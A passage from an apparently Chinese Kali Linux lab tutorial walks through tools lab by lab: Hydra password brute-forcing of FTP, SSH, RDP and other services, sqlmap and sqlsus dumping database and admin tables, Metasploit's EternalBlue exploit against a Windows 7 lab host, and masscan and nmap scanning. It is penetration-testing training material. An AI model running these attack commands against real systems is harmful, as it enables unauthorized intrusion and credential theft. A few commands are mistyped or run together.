class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在kali上面使用nc把本地的ceshi文件发送给靶机：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc 192.168.127.129 9999 &lt; ceshi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机上查看是否有文件生成（如果靶机接受文件不会自动停止，那就使用<code>ctrl+c</code>中止文件接受语句）：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在靶机上查看传输过来的文件看内容是否一致：</p> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握kali和centos使用NC传输文件的操作。</p><h1 id="实验-26-抓包工具–Netsniff-ng"><a href="#实验-26-抓包工具–Netsniff-ng" class="headerlink" title="实验 26 抓包工具–Netsniff-ng"></a>实验 26 抓包工具–Netsniff-ng</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用<br>netsniff-ng工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环<br>境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>netsniff-ng</p><p><strong>实验目的</strong></p><p>掌握netsniff-ng工具使用</p><h2 id="实验步骤-15"><a href="#实验步骤-15" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>抓取TCP或者UDP协议报文保存到dump.pcap</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsniff-ng --in eth0 --out dump.pcap tcp or udp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><strong>直接打开会出现乱码，需要结合其他分析工具进行分析数据包</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">capinfo dump.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><strong>测试网卡最高传输速率，方法是先用trafgen产生traffic让网卡满负荷，再用netsniff-ng抓包分析</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsniff-ng -i eth0 - o /dev/shm/c1.pcap -s -n 1000000 -b 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li><strong>分析抓包的数据包</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">capinfos /dev/shm/c1.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-6"><a href="#实验总结-6" class="headerlink" title="实验总结"></a>实验总结</h2><p>对比Netsniff-ng和Wireshark的差异性在那。</p><h1 id="实验27-Hash算法之MD5"><a href="#实验27-Hash算法之MD5" class="headerlink" title="实验27 Hash算法之MD5"></a>实验27 Hash算法之MD5</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用<br>MD5工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>md5sum</p><p><strong>实验目的</strong></p><p>掌握通过md5sum的使用和对比md5的HASH值</p><h2 id="实验步骤-16"><a href="#实验步骤-16" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>计算一个新建文件test.txt的md5值</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5sum test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><strong>修改文件中内容再重新计算md5值，对比之下发现md5变了</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5sum test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><strong>通过已知的md5值跟文件的md5值进行对比</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5sum –c md5.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-7"><a href="#实验总结-7" class="headerlink" title="实验总结"></a>实验总结</h2><p>掌握kali自带的MD5计算小工具的使用</p><h1 id="实验28-HASH算法之SHA"><a href="#实验28-HASH算法之SHA" class="headerlink" title="实验28 HASH算法之SHA"></a>实验28 HASH算法之SHA</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用SHA工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2018</p><p><strong>实验工具</strong></p><p>shasum</p><p><strong>实验目的</strong></p><p>掌握shasum工具等使用和对比文件HASH值</p><h2 id="实验步骤-17"><a href="#实验步骤-17" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>直接输出test.txt的SHA值</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shasum test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><strong>将sha1值输出到sha1.txt中</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sha1sum test.txt &gt; sha1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><strong>通过已知的sha1对文件的完整性进行比对</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sha1sum –c sha1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-8"><a href="#实验总结-8" class="headerlink" title="实验总结"></a>实验总结</h2><p>利用SHA1来快速比对文件的hash值是否发生变化</p><h1 id="实验-29-黑客安防工具-Hydra"><a href="#实验-29-黑客安防工具-Hydra" class="headerlink" title="实验 29 黑客安防工具-Hydra"></a>实验 29 黑客安防工具-Hydra</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Hydra工具，为<br>避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>windows 7</p><p><strong>实验工具</strong></p><p>hydra</p><p><strong>实验目的</strong></p><p>了解hydra并掌握使用hydra工具</p><h2 id="实验步骤-18"><a href="#实验步骤-18" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><strong>在终端输入hydra，可以看到相关使用语法</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><p><strong>参数列表:</strong></p><ul><li>-R 恢复上次停止的破解进度，继续破解</li><li>-S 使用SSL连接</li><li>-s PORT if the service is on a different default port, define it here</li><li>-s 端口号 在这里自定义要破解的端口号(替代默认端口)</li><li>-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE</li><li>-l 登录名 或者 - L 字典 使用登录名 或者 从字典中获取登录名单</li><li>-p PASS or -P FILE try password PASS, or load several passwords from FILE</li><li>-p 密码 或者 - P 字典 使用单个密码 或者 从字典中获取密码列表</li><li>-e ns 附加选项,n 是表示空密码,s 尝试使用密码进行破解</li><li>-C FILE colon-separated “login:pass” format, instead of -L/-P options</li><li>-C 文件 使用冒号分割格式 例如 “登录名:密码”来代替-L/-P参数</li><li>-M FILE server list for parallel attacks, one entry per line</li><li>-M 文件 服务器列表(译者:ip列表),一行一条</li><li>-o FILE write found login/password pairs to FILE instead of stdout</li><li>-o 文件 将找到的密码写在文件里面 以此代替输出到屏幕上</li><li>-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解</li><li>-t TASKS run TASKS number of connects in parallel (default: 16)</li><li>-t 计划任务 同时运行几个任务(默认是</li></ul></li></ol><p>: 16)</p><ul><li>-w TIME defines the max wait time in seconds for responses (default: 30)</li><li>-w 时间 定义超时时间秒数(默认是: 30)</li><li>-vV 详细显示用户名或者密码的破解过程</li></ul><ol start="3"><li><strong>用法</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra 可选参数+必选参数+攻击地址+攻击类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li><p><strong>举例：使用hydra尝试爆破FTP服务器账号密码</strong></p><ul><li>先在kali终端中尝试登录FTP服务器，看服务是否正常</li></ul></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp &lt;target_ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看本地的字典文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cat /usr/share/wordlists/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>加载本地的密码文件来进行爆破</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://&lt;target_ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用爆破的密码进行登录</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ftp &lt;target_ip&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li><p><strong>其它的一些破解类型</strong></p><ul><li>使用hydra破解SSH的密码</li></ul></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解HTTPS</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -m /index.php -l username -P pass.txt IP https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解Teamspeak</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l 用户名 - P 密码字典 - s 端口号 - vV ip teamspeak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解Cisco</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -P pass.txt IP ciscohydra -m cloud -P pass.txt 10.36.16.18 cisco-enable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>破解SMB</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l administrator -P pass.txt IP smb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解POP3</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l muts -P pass.txt my.pop3.mail pop3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解RDP</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra IP rdp -l administrator -P pass.txt -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解HTTP-Proxy</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l admin -P pass.txt http-proxy://10.36.16.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>破解Telnet</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra IP telnet -l 用户 - P 密码字典 - t 32 -s 23 -e ns -f –V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实验总结-9"><a href="#实验总结-9" class="headerlink" title="实验总结"></a>实验总结</h2><p>掌握使用Hydra来爆破常见的服务</p><h1 id="实验-30-黑客安防工具-Masscan"><a href="#实验-30-黑客安防工具-Masscan" class="headerlink" title="实验 30 黑客安防工具-Masscan"></a>实验 30 黑客安防工具-Masscan</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Masscan工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><ul><li>Kali 2016</li><li>Windows 7</li></ul><p><strong>实验工具</strong></p><ul><li>Masscan</li></ul><p><strong>实验目的</strong></p><p>了解掌握masscan工具的使用和语法</p><p><strong>实验步骤</strong></p><h2 id="Masscan的基本使用"><a href="#Masscan的基本使用" class="headerlink" title="Masscan的基本使用"></a>Masscan的基本使用</h2><ol><li><p>在终端输入以下命令启动Masscan：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>详细参数含义：</p><ul><li><code>-p</code> 指定端口进行扫描</li><li><code>--banners</code> 获取banner信息,支持少量的协议</li><li><code>--rate</code> 指定发包的速率</li><li><code>-c, --conf</code> 读取配置文件进行扫描</li><li><code>--echo</code> 将当前的配置重定向到一个配置文件中</li><li><code>-e, --adapter</code> 指定用来发包的网卡接口名称</li><li><code>--adapter-ip</code> 指定发包的IP地址</li><li><code>--adapter-port</code> 指定发包的源端口</li><li><code>--adapter-mac</code> 指定发包的源MAC地址</li><li><code>--router-mac</code> 指定网关的MAC地址</li><li><code>--exclude</code> IP地址范围黑名单，防止masscan扫描</li><li><code>--excludefile</code> 指定IP地址范围黑名单文件</li><li><code>--includefile, -iL</code> 读取一个范围列表进行扫描</li><li><code>--ping</code> 扫描应该包含ICMP回应请求</li><li><code>--append-output</code> 以附加的形式输出到文件</li><li><code>--iflist</code> 列出可用的网络接口，然后退出</li><li><code>--retries</code> 发送重试的次数，以1秒为间隔</li><li><code>--nmap</code> 打印与nmap兼容的相关信息</li><li><code>--http-user-agent</code> 设置user-agent字段的值</li><li><code>--show [open,close]</code> 告诉要显示的端口状态，默认是显示开放端口</li><li><code>--noshow [open,close]</code> 禁用端口状态显示</li><li><code>--pcap</code> 将接收到的数据包以libpcap格式存储</li><li><code>--regress</code> 运行回归测试，测试扫描器是否正常运行</li><li><code>--ttl</code> 指定传出数据包的TTL值，默认为255</li><li><code>--wait</code> 指定发送完包之后的等待时间，默认为10秒</li><li><code>--offline</code> 没有实际的发包，主要用来测试开销</li><li><code>-sL</code> 不执行扫描，主要是生成一个随机地址列表</li><li><code>--readscan</code> 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式</li><li><code>--connection-timeout</code> 抓取banners时指定保持TCP连接的最大秒数，默认是30秒</li></ul></li><li><p>示例命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan –p21,80,81,8080 192.168.163.0/24 --rate=10000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描指定21, 80, 81, 8080端口的192.168.163.0网段，以每秒10000个包的速率。</p></li></ol><h2 id="扫描指定IP文件中的地址"><a href="#扫描指定IP文件中的地址" class="headerlink" title="扫描指定IP文件中的地址"></a>扫描指定IP文件中的地址</h2><p>IP地址范围有三种有效格式：</p><ol><li><p>单独的IPv4地址</p></li><li><p>类似”10.0.0.1-10.0.0.233”的范围地址</p></li><li><p>CIDR地址，类似于”0.0.0.0/0”，多个目标可以用逗号隔开</p></li><li><p>扫描ip.txt中IP从1-1000端口并获取banner信息，发包速率为10000：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan -p1-1000 --rate=10000 --banners -iL ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握Masscan扫描工具的使用，对比其它的扫描软件的优势所在。</p><h1 id="实验-31-注入工具-Sqlmap"><a href="#实验-31-注入工具-Sqlmap" class="headerlink" title="实验 31 注入工具-Sqlmap"></a>实验 31 注入工具-Sqlmap</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Sqlmap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 Kali 2016<br>靶机 Windows 7 + mysqltest</p><p><strong>实验工具</strong></p><p>Sqlmap</p><p><strong>实验目的</strong></p><p>掌握sqlmap软件用法</p><p><strong>实验步骤</strong></p><h2 id="使用Sqlmap进行SQL注入攻击"><a href="#使用Sqlmap进行SQL注入攻击" class="headerlink" title="使用Sqlmap进行SQL注入攻击"></a>使用Sqlmap进行SQL注入攻击</h2><ol><li><p>访问简易测试网页：<a href="http://192.168.163.134/mysqltest/mysqltest/index.php?age=25">http://192.168.163.134/mysqltest/mysqltest/index.php?age=25</a></p></li><li><p>在终端中启动sqlmap：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用sqlmap检测URL是否存在注入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果存在注入，使用参数<code>--tables</code>列出表名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>列出指定数据库中表名和列：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" -D dbname -T tablename --columns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>跑出指定数据库中的数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" -D dbname -T tablename --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>跑出admin的哈希值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u "http://192.168.163.134/mysqltest/mysqltest/index.php?age=25" -D dbname -T admin_table --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>Sqlmap是注入非常强大的工具，需要熟练掌握其使用方法。</p><h1 id="实验-32-数据库评估-Sqlsus"><a href="#实验-32-数据库评估-Sqlsus" class="headerlink" title="实验 32 数据库评估-Sqlsus"></a>实验 32 数据库评估-Sqlsus</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Sqlsus工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 Kali 2016<br>靶机 Windows 7 + mysqltest</p><p><strong>实验工具</strong></p><p>Sqlsus</p><p><strong>实验目的</strong></p><p>掌握常用的数据库评估软件用法</p><p><strong>实验步骤</strong></p><h2 id="使用Sqlsus进行数据库评估"><a href="#使用Sqlsus进行数据库评估" class="headerlink" title="使用Sqlsus进行数据库评估"></a>使用Sqlsus进行数据库评估</h2><ol><li><p>访问简易测试网页：<a href="http://192.168.163.134/mysqltest/mysqltest/index.php?age=25">http://192.168.163.134/mysqltest/mysqltest/index.php?age=25</a></p></li><li><p>在终端输入以下命令启动Sqlsus：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus --wizard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>修改生成的配置文件，定位到<code>url_start</code>，输入需要检测的URL地址。</p></li><li><p>启动Sqlsus，使用<code>start</code>发起获取数据库信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --url-start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>可以使用<code>help</code>查看更多命令。</p></li><li><p>获取表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --get tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取表中的列名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --get columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取admin表的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlsus -config-file path/to/config/file.conf --dump "select * from admin"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握Sqlsus软件的使用。</p><h1 id="实验-33-网络嗅探-Tcpdump"><a href="#实验-33-网络嗅探-Tcpdump" class="headerlink" title="实验 33 网络嗅探-Tcpdump"></a>实验 33 网络嗅探-Tcpdump</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Tcpdump工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>tcpdump</p><p><strong>实验目的</strong></p><p>使用tcpdump工具捕获数据包</p><h2 id="实验步骤-19"><a href="#实验步骤-19" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>直接启动tcpdump将监视第一个网络接口上所有流过的数据包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定网络接口进行抓包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump -i eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>监听指定主机或ip地址的数据包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump host 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>监听主机或ip所发送的所有数据包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump src host 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>监听主机或ip所接收的所有数据包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump dst host 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>监听指定主机或ip地址之间的数据包</p><pre class="line-numbers language-none"><code class="language-none">tcpdump src host 192.168.1.1 and dst host 192.168.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>再开一个终端，ping本机的网关，我们需要通过tcpdump工具进行抓包</p><p><strong>参数详解</strong></p><ul><li><code>-a</code>：尝试将网络和广播地址转换成名称；</li><li><code>-c &lt;数据包数目&gt;</code>：收到指定的数据包数目后，就停止进行倾倒操作；</li><li><code>-d</code>：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；</li><li><code>-dd</code>：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；</li><li><code>-ddd</code>：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；</li><li><code>-e</code>：在每列倾倒资料上显示连接层级的文件头；</li><li><code>-f</code>：用数字显示网际网络地址；</li><li><code>-F &lt;表达文件&gt;</code>：指定内含表达方式的文件；</li><li><code>-i &lt;网络界面&gt;</code>：使用指定的网络截面送出数据包；</li><li><code>-l</code>：使用标准输出列的缓冲区；</li><li><code>-n</code>：不把主机的网络地址转换成名字；</li><li><code>-N</code>：不列出域名；</li><li><code>-O</code>：不将数据包编码最佳化；</li><li><code>-p</code>：不让网络界面进入混杂模式；</li><li><code>-q</code>：快速输出，仅列出少数的传输协议信息；</li><li><code>-r &lt;数据包文件&gt;</code>：从指定的文件读取数据包数据；</li><li><code>-s &lt;数据包大小&gt;</code>：设置每个数据包的大小；</li><li><code>-S</code>：用绝对而非相对数值列出TCP关联数；</li><li><code>-t</code>：在每列倾倒资料上不显示时间戳记；</li><li><code>-tt</code>：在每列倾倒资料上显示未经格式化的时间戳记；</li><li><code>-T &lt;数据包类型&gt;</code>：强制将表达方式所指定的数据包转译成设置的数据包类型；</li><li><code>-v</code>：详细显示指令执行过程；</li><li><code>-vv</code>：更详细显示指令执行过程；</li><li><code>-x</code>：用十六进制字码列出数据包资料；</li><li><code>-w &lt;数据包文件&gt;</code>：把数据包数据写入指定的文件。</li></ul><p><strong>实验总结</strong></p><p>使用Tcpdump抓取特定的协议报文</p><h1 id="实验34-MS17-010漏洞复现"><a href="#实验34-MS17-010漏洞复现" class="headerlink" title="实验34 MS17_010漏洞复现"></a>实验34 MS17_010漏洞复现</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器复现MS17_010漏洞，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018 ip地址：192.168.163.152<br>靶机 windows 7 ip地址：192.168.163.134</p><p><strong>实验工具</strong></p><p>无</p><p><strong>实验目的</strong></p><p>metasploit利用ms17_010去攻击靶机</p><h2 id="实验步骤-20"><a href="#实验步骤-20" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali终端中输入msfconsole启动metasploit</p><pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>启动后搜索漏洞相关的模块</p><pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>先利用扫描模块对win 7 靶机进行扫描，检测看是否存在漏洞</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/smb/smb_ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用该模块后设置目标IP或者IP段</p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.163.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行扫描</p><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用ms17_010漏洞模块对靶机进行攻击</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/smb/ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看可设置的选项</p><pre class="line-numbers language-none"><code class="language-none">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置靶机目标ip</p><pre class="line-numbers language-none"><code class="language-none">set RHOST 192.168.163.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行攻击</p><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>因为MS17_010是近几年新爆出的漏洞，所以还有很多用户没有升级打补丁，在内网可以进行检测看还有没有主机存在漏洞</p><h1 id="实验35-Web应用指纹识别器-Whatweb"><a href="#实验35-Web应用指纹识别器-Whatweb" class="headerlink" title="实验35 Web应用指纹识别器-Whatweb"></a>实验35 Web应用指纹识别器-Whatweb</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某</p><p>天他收到上级领导命令，需要在kali服务器使用Whatweb工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016 192.168.21.128</p><p><strong>实验工具</strong></p><p>whatweb</p><p><strong>实验目的</strong></p><p>掌握whatweb的使用</p><h2 id="实验步骤-21"><a href="#实验步骤-21" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在终端直接启动whatweb软件</p><pre class="line-numbers language-none"><code class="language-none">whatweb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看whatweb版本号</p><pre class="line-numbers language-none"><code class="language-none">whatweb --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看有哪些可用的插件</p><pre class="line-numbers language-none"><code class="language-none">whatweb --l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用whatweb识别网站的指纹</p><pre class="line-numbers language-none"><code class="language-none">whatweb --target http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>对当个目标进行简单的探测</p><pre class="line-numbers language-none"><code class="language-none">whatweb http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p><strong>实验总结</strong></p><p>掌握使用Whatweb对web服务器进行嗅探测试</p><h1 id="实验-36-端口扫描之-Nmap"><a href="#实验-36-端口扫描之-Nmap" class="headerlink" title="实验 36 端口扫描之-Nmap"></a>实验 36 端口扫描之-Nmap</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Nmap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali<br>靶机：centos 6.9<br>靶机ip地址：192.168.163.136</p><p><strong>实验工具</strong></p><p>Nmap</p><p><strong>实验目的</strong></p><p>掌握nmap端口扫描</p><h2 id="实验步骤-22"><a href="#实验步骤-22" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>查看kali自带nmap的版本号</p><pre class="line-numbers language-none"><code class="language-none">nmap -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap的ping扫描本网段存活的主机(ip地址后面加掩码即扫描本网段)</p><pre class="line-numbers language-none"><code class="language-none">nmap -sP 192.168.163.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap的SYN半开放扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap -sS 192.168.163.136/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap的TCP扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap -sT 192.168.163.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>nmap扫描靶机所有开放端口</p><pre class="line-numbers language-none"><code class="language-none">nmap -p- 192.168.163.136<span aria-hidden="true" 